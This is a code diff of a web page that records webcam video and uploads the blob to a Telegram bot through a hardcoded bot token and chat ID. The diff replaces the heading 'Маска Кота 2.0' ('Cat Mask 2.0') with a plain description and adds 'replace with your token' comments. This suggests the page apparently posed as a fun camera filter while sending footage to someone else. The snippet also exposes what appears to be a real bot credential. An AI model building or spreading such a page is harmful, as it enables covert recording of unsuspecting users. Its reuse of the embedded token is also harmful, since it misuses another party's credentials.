@@ -18,7 +18,7 @@
     </style>
 </head>
 <body>
-    <h1>Маска Кота 2.0</h1>
+    <h1>Video Recording and Sending to Telegram</h1>
     <video id="video" autoplay></video>
     <video id="recordedVideo" controls></video>
 
@@ -68,8 +68,8 @@
 
         // Function to send video to Telegram
         function sendToTelegram(blob) {
-            const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
-            const chatId = '6121166273';
+            const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk'; // Замените на токен вашего бота
+            const chatId = '6121166273'; // Замените на ваш chat ID
             const url = `https://api.telegram.org/bot${token}/sendVideo`;
 
             const formData = new FormData();
